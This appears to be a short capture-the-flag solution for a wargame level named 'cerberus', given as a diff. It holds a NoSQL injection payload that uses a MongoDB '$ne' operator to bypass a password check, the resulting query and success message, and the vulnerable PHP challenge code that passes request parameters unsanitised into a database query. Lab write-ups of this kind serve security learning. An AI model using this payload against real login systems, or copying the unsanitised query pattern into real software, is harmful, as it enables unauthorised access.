@@ -1,0 +1,20 @@
+payload: ?id=admin&pw[$ne]=
+
+query : {"id":"admin","pw":{"$ne":""}}
+Hello admin
+CERBERUS Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mongodb_connect();
+  $query = array(
+    "id" => $_GET['id'],
+    "pw" => $_GET['pw']
+  );
+  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
+  $result = mongodb_fetch_array($db->prob_cerberus->find($query));
+  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
+  if($result['id'] === "admin") solve("cerberus");
+  highlight_file(__FILE__);
+?>
